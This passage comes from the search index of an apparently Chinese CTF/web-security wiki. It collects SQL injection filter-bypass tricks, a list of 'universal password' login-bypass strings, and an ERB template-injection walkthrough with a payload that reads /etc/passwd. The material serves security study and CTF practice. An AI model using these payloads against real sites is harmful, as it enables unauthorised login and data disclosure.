<p>\u591a\u8bf4\u4e00\u70b9\uff1a\u6211\u8bb0\u5f97\u901a\u8fc7\u8fd9\u4e2a\u6027\u8d28\u53ef\u4ee5\u8fbe\u5230\u4fee\u6539\u865a\u62df\u8868\u4e2d\u7684\u6570\u636e\uff0c\u7136\u540e\u5982\u679c\u540e\u53f0\u8bed\u53e5\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u6765\u8fdb\u884c\u64cd\u4f5c\u5904\u7406\u65f6\uff0c\u76f8\u5f53\u4e8e\u5b83\u6240\u4f7f\u7528\u7684\u8868\u4e2d\u53c2\u6570\u5df2\u7ecf\u53ef\u4ee5\u88ab\u6211\u4eec\u63a7\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e2a\u865a\u62df\u8868\u6570\u636e\u6765\u8fdb\u884c\u8ba4\u8bc1\u3002</p>"},{"location":"web/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_3","title":"\u8054\u5408\u67e5\u8be2\u793a\u4f8b","text":""},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"SQL\u6ce8\u5165\u7ed5\u8fc7\u59ff\u52bf","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>sql\u6ce8\u5165\u7684\u539f\u7406\u4e86\u89e3\u4e86\u4e2a\u5927\u6982\u5176\u5b9e\u4e5f\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u8fd9\u4e2a\u6a21\u5757\u662f\u59ff\u52bf\u591a\uff0c\u4f46\u662f\u6f0f\u6d1e\u81ea\u8eab\u5e94\u8be5\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u503c\u5f97\u6316\u6398\u7684\u5730\u65b9\uff08\u5982\u679c\u6709\u7684\u8bdd\uff1a\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u8f93\u5165\uff01\uff01\uff01\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u8fdb\u9636\u7684\u59ff\u52bf\uff0c\u672c\u4eba\u80fd\u529b\u6709\u9650\uff0c\u5982\u679c\u53d1\u73b0\u65b0\u59ff\u52bf\u968f\u65f6\u6b22\u8fce\u4ea4\u6d41\u5199\u5165\uff1a</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#1-a0","title":"1.\u7ed5\u8fc7\u7a7a\u683c\uff08\u6ce8\u91ca\u7b26/ /\uff0c%a0\uff09","text":"<p>\u76f4\u63a5\u6765\u770b\u59ff\u52bf\u597d\u4e86</p> <pre><code>\u4e24\u4e2a\u7a7a\u683c\u4ee3\u66ff\u4e00\u4e2a\u7a7a\u683c\uff0c\u7528Tab\u4ee3\u66ff\u7a7a\u683c\uff0c%a0=\u7a7a\u683c%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\u5176\u4e2d%09\u9700\u8981php\u73af\u5883\uff0c%0a\u4e3a\\n/!select/\u4e3amysql\u72ec\u6709\u3002\u5e38\u89c1\u7528\u6cd5\u4e3a/!50727select 1/\uff0c\u5373\u5f53\u7248\u672c\u53f7\u5c0f\u4e8e\u7b49\u4e8e50727\u65f6\u6267\u884cselect 1\u5176\u5b9e/**/\u4e5f\u5c31\u662f\u6ce8\u91ca\u6cd5\u662f\u7528\u7684\u6700\u591a\u7684select/**/schema_name/**/from/**/information_schema.schemata\u66ff\u6362\u4e00\u4e0b\uff0c\u95ee\u9898\u4e0d\u5927\u3002\nPlain Text\n</code></pre> <p>\u4e0a\u9762\u7684\u90fd\u662f\u66ff\u6362\uff0c\u7136\u540e</p> <p>\u5728MySQL\u4e2d\uff0c\u62ec\u53f7\u662f\u7528\u6765\u5305\u56f4\u5b50\u67e5\u8be2\u7684\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7ed3\u679c\u7684\u8bed\u53e5\uff0c\u90fd\u53ef\u4ee5\u7528\u62ec\u53f7\u5305\u56f4\u8d77\u6765\u3002\u800c\u62ec\u53f7\u7684\u4e24\u7aef\uff0c\u53ef\u4ee5\u6ca1\u6709\u591a\u4f59\u7684\u7a7a\u683c\u3002</p> <pre><code>select(user())from dual where(1=1)and(ha2=2)\nPlain Text\n</code></pre> <p>\u6628\u5929\u5728\u7fa4\u91cc\u9762py\u7684[0xfor x in [1,2,3]]\u8fd4\u56de15\u662f\u4e0d\u662f\u4e5f\u5dee\u4e0d\u591a\u7684\u611f\u89c9\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#2","title":"2.\u7ed5\u8fc7\u5355\u5f15\u53f7","text":"<p>\u8fd9\u4e2a\u8fc7\u6ee4\u7684\u8bdd\u4f1a\u6bd4\u8f83\u5934\u75bc\uff0c\u4f46\u4e5f\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u529e\u6cd5</p> <pre><code>select column_name  from information_schema.tables where table_name=\"users\"\u3000users\u7684\u5341\u516d\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u662f7573657273\u3002\u90a3\u4e48\u6700\u540e\u7684sql\u8bed\u53e5\u5c31\u53d8\u4e3a\u4e86select column_name  from information_schema.tables where table_name=0x7573657273\u53c8\u6216\u8005\u662f\u4e0b\u9762\u7684%bf%270xbf27\u4e0d\u662f\u6709\u4e00\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u4f46\u662f\u7ecf\u8fc7addslashed()\u8f6c\u6362\u540e\u5c31\u53d8\u62100xbf5c27,0xbf5c\u662f\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u6240\u4ee50xbf5c27\u4f1a\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b260xbf5c\u548c\u4e00\u4e2a\u5355\u7ef0\u53f7\u6765\u5904\u7406\uff0c\u7ed3\u679c\u662f\u8ddf\u5728\u5f15\u53f7\u540e\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u4e86\u6267\u884c\u3002\u5728phpcms2007\u7a0b\u5e8f\u91cc\u7531\u591a\u5b57\u8282\u7f16\u7801\u6f0f\u6d1e\u5f15\u53d1\u7684\u6f0f\u6d1e\u6709\u591a\u4e2a\uff0c\u4ee5area.php\u6587\u4ef6\u91cc\u7684\u6f0f\u6d1e\u6765\u4f5c\u6d4b\u8bd5\u3002\u6240\u4ee5\u8fd9\u4e2a\u8981\u6c42\u5c31\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u9ad8\u4e86\u3002\u9700\u8981\u6709addslashed()\u8fd9\u4e2a\u8fc7\u6ee4\u51fd\u6570\nPlain Text\n</code></pre> <p>\u9664\u4e86\u4e0a\u9762\u7684\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8f6c\u4e49\u7b26\\</p> <p>\u81f3\u4e8e\u539f\u7406\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u4f8b\u5b57\uff0c\u4f46\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca(\u7b2c6\u884c\u6211\u662f\u6545\u610f\u6362\u7684\u884c)</p> <pre><code>select * from user_table where username=' username ' and password='  password '\nselect * from user_table where username='username\\' and password =' and union select xxx\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#3","title":"3.\u9017\u53f7\u7ed5\u8fc7","text":"<p>\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u5230substr(),mid(),limit\u3002\u8fd9\u4e9b\u5b50\u53e5\u65b9\u6cd5\u90fd\u9700\u8981\u4f7f\u7528\u5230\u9017\u53f7\u3002\u5bf9\u4e8esubstr()\u548cmid()\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528<code>from to</code>\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\uff1a</p> <pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);\nPlain Text\n</code></pre> <p>\u4f7f\u7528join\uff1a</p> <pre><code>union select 1,2     #\u7b49\u4ef7\u4e8eunion select * from (select 1)a join (select 2)b\nPlain Text\n</code></pre> <p>\u4f7f\u7528like\uff1a</p> <pre><code>select ascii(mid(user(),1,1))=80   #\u7b49\u4ef7\u4e8eselect user() like 'r%'\nPlain Text\n</code></pre> <p>\u5bf9\u4e8e<code>limit</code>\u53ef\u4ee5\u4f7f\u7528<code>offset</code>\u6765\u7ed5\u8fc7\uff1a</p> <pre><code>select * from news limit 0,1# \u7b49\u4ef7\u4e8e\u4e0b\u9762\u8fd9\u6761SQL\u8bed\u53e5select * from news limit 1 offset 0\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#5sqlmap","title":"5.\u6bd4\u8f83\u7b26\u53f7\uff08&lt;&gt;\uff09\u7ed5\u8fc7\uff08\u8fc7\u6ee4\u4e86&lt;&gt;\uff1asqlmap\u76f2\u6ce8\u7ecf\u5e38\u4f7f\u7528&lt;&gt;\uff09","text":"<pre><code>\u4f7f\u7528greatest()\u3001least\uff08\uff09\uff1a\uff08\u524d\u8005\u8fd4\u56de\u6700\u5927\u503c\uff0c\u540e\u8005\u8fd4\u56de\u6700\u5c0f\u503c\uff09#\n\n\u540c\u6837\u662f\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u5728\u4f7f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u5230\u6bd4\u8f83\u64cd\u4f5c\u7b26\u6765\u8fdb\u884c\u67e5\u627e\u3002\u5982\u679c\u65e0\u6cd5\u4f7f\u7528\u6bd4\u8f83\u64cd\u4f5c\u7b26\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4f7f\u7528\u5230greatest\u6765\u8fdb\u884c\u7ed5\u8fc7\u4e86\u3002\n\u6700\u5e38\u89c1\u7684\u4e00\u4e2a\u76f2\u6ce8\u7684sql\u8bed\u53e5\uff1a\nselect * from users where id=1 and ascii(substr(database(),0,1))&gt;64\n\u6b64\u65f6\u5982\u679c\u6bd4\u8f83\u64cd\u4f5c\u7b26\u88ab\u8fc7\u6ee4\uff0c\u4e0a\u9762\u7684\u76f2\u6ce8\u8bed\u53e5\u5219\u65e0\u6cd5\u4f7f\u7528,\u90a3\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528greatest\u6765\u4ee3\u66ff\u6bd4\u8f83\u64cd\u4f5c\u7b26\u4e86\u3002greatest(n1,n2,n3,...)\u51fd\u6570\u8fd4\u56de\u8f93\u5165\u53c2\u6570(n1,n2,n3,...)\u7684\u6700\u5927\u503c\u3002\n\u90a3\u4e48\u4e0a\u9762\u7684\u8fd9\u6761sql\u8bed\u53e5\u53ef\u4ee5\u4f7f\u7528greatest\u53d8\u4e3a\u5982\u4e0b\u7684\u5b50\u53e5:\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\u4f7f\u7528between and\uff1a\n#\nbetween a and b\uff1a\nbetween 1 and 1; \u7b49\u4ef7\u4e8e =1\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#6or-and-xor-not","title":"6.or and xor not\u7ed5\u8fc7\uff1a","text":"<pre><code>and=&amp;&amp;  or=||   xor=|   not=!\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#7-","title":"7.\u7ed5\u8fc7\u6ce8\u91ca\u7b26\u53f7\uff08#\uff0c--(\u540e\u9762\u8ddf\u4e00\u4e2a\u7a7a\u683c\uff09\uff09\u8fc7\u6ee4","text":"<pre><code>id=1' union select 1,2,3||'1\u3000\u6700\u540e\u7684or '1\u95ed\u5408\u67e5\u8be2\u8bed\u53e5\u7684\u6700\u540e\u7684\u5355\u5f15\u53f7\uff08\u8fd8\u662f\u7275\u626f\u5230\u4e00\u4e9bor\uff0c\u548cc\u8bed\u8a00\u4e00\u6837\uff0c\u524d\u9762\u7684\u9519\u4e86\u518d\u8bf4\uff09\u6216\u8005\uff1a\nid=1' union select 1,2,'3\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#8","title":"8.=\u7ed5\u8fc7","text":"<pre><code>\u4f7f\u7528like \u3001rlike \u3001regexp \u6216\u8005 \u4f7f\u7528&lt; or &gt;\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#9union-selectwhere","title":"9.\u7ed5\u8fc7union select\uff0cwhere\u7b49","text":"<pre><code>\uff081\uff09\u4f7f\u7528\u6ce8\u91ca\u7b26\u7ed5\u8fc7\uff1a#\n\u5e38\u7528\u6ce8\u91ca\u7b26\uff1a\uff08\u8d85\u5f3a\u7684\u6ce8\u91ca\uff01\uff09\n//\uff0c-- , /**/, #, --+, -- -, ;,%00,--a\n\u7528\u6cd5\uff1a\nU/**/ NION /**/ SE/**/ LECT /**/user\uff0cpwd from user\n\uff082\uff09\u4f7f\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7\uff1a#\nid=-1'UnIoN/**/SeLeCT\n\uff083\uff09\u5185\u8054\u6ce8\u91ca\u7ed5\u8fc7\uff1a#\nid=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n\uff084\uff09 \u53cc\u5173\u952e\u5b57\u7ed5\u8fc7\uff08\u82e5\u5220\u9664\u6389\u7b2c\u4e00\u4e2a\u5339\u914d\u7684union\u5c31\u80fd\u7ed5\u8fc7\uff09\uff1a#\nid=-1'UNIunionONSeLselectECT1,2,3\u2013-\nPlain Text\n</code></pre> <p>\u6700\u540e\u4e00\u4e2a\u662f\u67d0\u9053\u539f\u9898\uff0c\u975e\u5e38\u62b1\u6b49\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#10","title":"10.\u901a\u7528\u7ed5\u8fc7\uff08\u7f16\u7801\uff09","text":"<p>\u5982URLEncode\u7f16\u7801\uff0cASCII,HEX,unicode\u7f16\u7801\u7ed5\u8fc7\uff1a</p> <pre><code>or 1=1\u5373%6f%72%20%31%3d%31\uff0c\u800cTest\u4e5f\u53ef\u4ee5\u4e3aCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\u3002\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#11","title":"11.\u7b49\u4ef7\u51fd\u6570\u7ed5\u8fc7","text":"<pre><code>hex()\u3001bin() ==&gt; ascii()[ord()?]\nsleep() ==&gt;benchmark()\nconcat_ws()==&gt;group_concat()\nmid()\u3001substr() ==&gt; substring()\n@@user ==&gt; user()\n@@datadir ==&gt; datadir()\n\u4e3e\u4f8b\uff1asubstring()\u548csubstr()\u65e0\u6cd5\u4f7f\u7528\u65f6\uff1a?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74\n\u6216\u8005\uff1asubstr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1\nPlain Text\n</code></pre>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#12pcre","title":"12.PCRE\u7ed5\u8fc7","text":"<pre><code>union/*'+'a'*1000001+'*/select\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u539f\u7406\u6211\u4e00\u5b9a\u4f1a\u6709\u673a\u4f1a\u4ecb\u7ecd\u7684\u3002</p> <p>\u7a0d\u5fae\u89e3\u91ca\uff1apcre\u6709\u5339\u914d\u4e0a\u9650\u7684\u9650\u5236\uff0c\u503c\u4e3a1000000\uff0c\u5e76\u4e14\u5339\u914d\u8bed\u53e5\uff08preg\u51fd\u6570\uff09\u4e2d\u5fc5\u987b\u8981\u6709\u4e00\u4e2a.\u8fd9\u6837\u5728\u5339\u914d\u65f6\u4ed6\u78b0\u5230\u8fd9\u4e2a\u5c31return\uff08\u6709\u70b9\u50cf\u9012\u5f52\uff09\u4e00\u6b21\uff0c\u8d85\u8fc7\u4e00\u767e\u4e07\u6b21\u540e\u51fd\u6570\u5931\u6548\u3002</p> <p>sql\u6ce8\u5165\u4e2d\u6211\u6682\u65f6\u7684\u6ca1\u9047\u89c1\u8fc7\uff0c\u6240\u4ee5\u8fd9\u4e2a10000001\u6211\u4e5f\u4e0d\u592a\u61c2\uff08+1\u662f\u5e72\u561b\u7684\uff09\u3002</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#13with-rollup","title":"13.WITH ROLLUP\u7ed5\u8fc7","text":"<p>\u4e0d\u89e3\u91ca\u4e86</p> <p>\u5b9e\u9a8c\u5427  \u56e0\u7f3a\u601d\u6c40\u7684\u7ed5\u8fc7  By  Assassin\uff08with rollup\u7edf\u8ba1\uff09_Assassin-CSDN\u535a\u5ba2</p> <p>\u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u6bd4\u8f83\u65b0\u9c9c\u7684\uff0c\u5f88\u4e45\u6ca1\u56de\u5b9e\u9a8c\u5427\u4e86\u5b66\u5230\u4e86\u5f88\u591a\u7684\u59ff\u52bf~\u4e0d\u5f97\u4e0d\u8bf4\u4e0d\u770b\u63d0\u793a\u771f\u5fc3\u60f3\u4e0d\u5230\u8fd9\u4e9b\uff0c\u55ef\u3002\u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3\u9898\u76ee\u4e2dphp\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u9996\u5148\u5ba1\u6e90\u7801\u5f97\u5230\u4e86source.txt\u5f97\u5230\u4e86\u6e90\u7801\uff0c\u7136\u540e\u6211\u4eec\u770b\u4e00\u4e0b\u6e90\u7801\u5e72\u4e86\u4ec0\u4e48\uff0c\u4e3b\u8981\u5c31\u662f\u4e00\u4e2a\u767b\u9646\u8ba4\u8bc1\uff01&lt;?phperror_reporting(0);if (!isset(_POST['uname']) || !isset(_POST['pwd'])) {</p> <p>https://blog.csdn.net/qq_35078631/article/details/54772798</p> <p>MySQL GROUP BY \u8bed\u53e5 | \u83dc\u9e1f\u6559\u7a0b</p> <p>MySQL GROUP BY \u8bed\u53e5  GROUP BY \u8bed\u53e5\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u3002 \u5728\u5206\u7ec4\u7684\u5217\u4e0a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 COUNT, SUM, AVG,\u7b49\u51fd\u6570\u3002 GROUP BY \u8bed\u6cd5  SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name;   \u5b9e\u4f8b\u6f14\u793a \u672c\u7ae0\u8282\u5b9e\u4f8b..</p> <p>http://www.runoob.com/mysql/mysql-group-by-statement.html</p>"},{"location":"web/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","title":"\u4e07\u80fd\u5bc6\u7801","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u53ea\u662f\u8fd9\u4e48\u4e2a\u53eb\u6cd5\u800c\u5df2</p> <p>\u4f5c\u7528\u53ea\u80fd\u8bf4\u662f\u666e\u666e\u901a\u901a\u3002</p> <pre><code>'or 1=1/*\n\"or \"a\"=\"a\n\"or 1=1--\n\"or\"=\"\n\"or\"=\"a'='a\n\"or1=1--\n\"or=or\"\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or\"=\"a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1-- asp aspx \"or \"a\"=\"a\n'.).or.('.a.'='.a\nor 1=1--\n'or 1=1--\na'or' 1=1--\n\"or 1=1--\n'or.'a.'='a\n\"or\"=\"a'='a\n'or''='\nor'='or' jsp 1'or'1'='1\nadmin' or 1=1/*\nPlain Text\n</code></pre>"},{"location":"web/ssti/erb%E6%B3%A8%E5%85%A5/","title":"erb\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6e90\u81earuby</p> <p></p> <p>\u4f7f\u7528\u9884\u89c8\uff08preview\uff09\u6309\u94ae\u63d0\u4ea4\u8868\u683c\u540e\uff0c\u5448\u73b0\u5728\u6211\u4eec\u773c\u524d\u662f\u5305\u542b\u7528\u6237\u4fe1\u606f\u4ee5\u53ca\u7528\u6237\u521b\u5efa\u65f6\u95f4\u7684\u4e00\u4e2a\u9875\u9762\uff1a</p> <p>\u89c2\u5bdf\u4ee3\u7801\u4e2d\u83b7\u53d6username\u4ee5\u53catombstone\u65f6\u6240\u4f7f\u7528\u7684\u8bed\u6cd5\uff0c\u6839\u636e\u5176\u4e2d\u7684&lt;%=\u8bed\u6cd5\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9bRuby\u6280\u672f\uff0c\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u8fd9\u6bb5\u4ee3\u7801\u5c5e\u4e8eRuby/ERB\u4ee3\u7801\u3002\u57fa\u4e8e\u8fd9\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u8f91\u8f93\u5165\u6570\u636e\uff0c\u6d4b\u8bd5\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u6a21\u677f\u6ce8\u5165\u3002\u5927\u81f4\u6d4f\u89c8ERB\u6587\u6863\u540e\uff0c\u6211\u4eec\u4e86\u89e3\u5230&lt;%=\u8bed\u6cd5\u53ef\u4ee5\u7528\u6765\u6267\u884cRuby\u8bed\u53e5\uff0c\u5e76\u4f1a\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u4ee5\u9644\u5728\u6700\u7ec8\u7684\u7ed3\u679c\u6587\u672c\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u653b\u51fb\u8f7d\u8377\u6765\u5c1d\u8bd5\u6267\u884c\u6570\u5b66\u8fd0\u7b97\uff1a</p> <p></p> <p>\u6211\u60f3\u8bf4\u7684\u662f\uff0c\u8bb0\u4f4f\u8fd9\u4e2a\u9875\u9762\uff01\uff01\uff01</p> <p>\u800c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff1a</p> <p>ruby &lt;%= 7 * 7 %&gt;</p> <p>\u8fd0\u7b97\u7ed3\u679c\u4e3a49\uff0c\u6bcf\u4e2a\u7528\u6237\u90fd\u4f1a\u6253\u5370\u4e00\u6b21\u8fd0\u7b97\u7ed3\u679c</p> <p></p> <p>ruby &lt;%= File.open(\u2018/etc/passwd\u2019).read %&gt;</p> <p>\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u3002\u975e\u5e38\u597d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bd5\u8bd5\u770b\u80fd\u5426\u6267\u884c\u51fd\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u6765\u6d4b\u8bd5\u81ea\u5e26\u7684\u5168\u5c40\u51fd\u6570\u662f\u5426\u80fd\u7528\u5230\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5982\u4e0b\u8fd9\u79cd\u8f7d\u8377\uff1a</p> <p></p> <p>\u641e\u5b9a\u3002</p> <p>\u7531\u4e8e\u4e0d\u5b89\u5168\u64cd\u4f5c\u7684\u539f\u56e0\uff0c\u7cfb\u7edf\u963b\u6b62\u6211\u4eec\u8bbf\u95eeFile.open\u51fd\u6570\u3002Ruby\u7684ERB\u6a21\u677f\u5f15\u64ce\u5305\u542b\u4e00\u4e2a\u5b89\u5168\u7ea7\u522b\uff08safe level\uff09\u53c2\u6570\uff0c\u5f53\u5b89\u5168\u7ea7\u522b\u8bbe\u7f6e\u4e3a0\u4ee5\u4e0a\u7684\u67d0\u4e2a\u503c\uff08\u6bd4\u59823\uff09\u65f6\uff0c\u6211\u4eec\u65e0\u6cd5\u5728\u6a21\u677f\u7ed1\u5b9a\uff08template binding\uff09\u4e2d\u6267\u884c\u5305\u62ec\u6587\u4ef6\u64cd\u4f5c\u5728\u5185\u7684\u67d0\u4e9b\u51fd\u6570\u3002\u5982\u679c\u5e94\u7528\u4f7f\u7528\u7684\u5b89\u5168\u7ea7\u522b\u4e3a4\uff0c\u90a3\u4e48\u5b83\u4f1a\u4f7f\u7528\u6700\u4e3a\u4e25\u683c\u7684\u9694\u79bb\u673a\u5236\uff0c\u53ea\u80fd\u6267\u884c\u6807\u8bb0\u4e3a\u53ef\u4fe1\u72b6\u6001\u7684\u90a3\u4e9b\u4ee3\u7801\u3002\u56e0\u6b64\uff0c\u770b\u6837\u5b50\u7ba1\u7406\u5458\u5728\u8fd9\u4e2a\u6a21\u677f\u5f15\u64ce\u4e2d\u8bbe\u7f6e\u4e86\u5b89\u5168\u7ea7\u522b\u3002\u867d\u7136\u6211\u4eec\u7684\u653b\u51fb\u4e0d\u4f1a\u50cf\u8bfb\u5199\u786c\u76d8\u6587\u4ef6\u90a3\u6837\u7b80\u5355\uff0c\u4f46\u8fd9\u91cc\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u8bb8\u591a\u653b\u51fb\u9762\u3002\u6bd4\u5982\uff0c\u5bf9\u4e8e\u76ee\u524d\u53ef\u7528\u7684\u8fd9\u4e9b\u5c0f\u5de5\u5177\uff08gadget\uff09\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u4ec0\u4e48\u64cd\u4f5c\uff1f\u5982\u679c\u6211\u4eec\u60f3\u5206\u6790self\u5bf9\u8c61\uff08self-object\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u679a\u4e3e\u8be5\u5bf9\u8c61\u53ef\u7528\u7684\u5c5e\u6027\u53ca\u65b9\u6cd5\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\uff1a</p> <p>ruby&lt;%= self %&gt;</p> <p></p> 